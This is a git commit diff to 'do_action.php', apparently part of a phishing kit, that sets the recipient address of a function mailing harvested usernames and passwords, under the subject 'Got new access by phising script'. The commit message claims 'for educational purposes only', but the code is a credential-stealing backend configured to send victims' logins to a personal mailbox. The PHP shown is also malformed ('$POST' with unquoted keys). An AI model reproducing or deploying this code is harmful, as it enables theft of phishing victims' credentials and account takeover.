c8a179f158ae3a58cab9fee2ea01a14cf84d9484
Vince <59480961+vincexvince@users.noreply.github.com>
2020-02-16 12:20:59 +0800

    vnclabastida@yahoo.com
    for educational purposes only

--- do_action.php
+++ do_action.php
@@ -2,7 +2,7 @@
 	mail_sender(){
 		$username = $POST[username];
 		$password = $POST[password];
-		$reciever = "YOUR-EMAIL ADRRESS";
+		$reciever = "vnclabastida@yahoo.com";
 		$subject = "Got new access by phising script";
 		$message = "The username is ". $username;
 		$message .= "and password is ". $password;
